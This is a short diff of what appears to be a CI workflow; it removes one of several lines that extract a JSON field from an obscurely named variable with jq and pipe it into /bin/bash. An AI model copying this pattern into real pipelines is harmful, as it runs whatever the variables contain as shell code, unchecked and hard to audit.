@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$dhe7560" | jq -r .toos672 | /bin/bash
           printf '%s' "$zk71" | jq -r .v998 | /bin/bash
           printf '%s' "$vjc78139" | jq -r .sncy97 | /bin/bash
-          echo $tgx5 | jq -r .iiwbh7 | /bin/bash
           printf '%s' "$pst43" | jq -r .btlk971 | /bin/bash
 
       - name: Save output
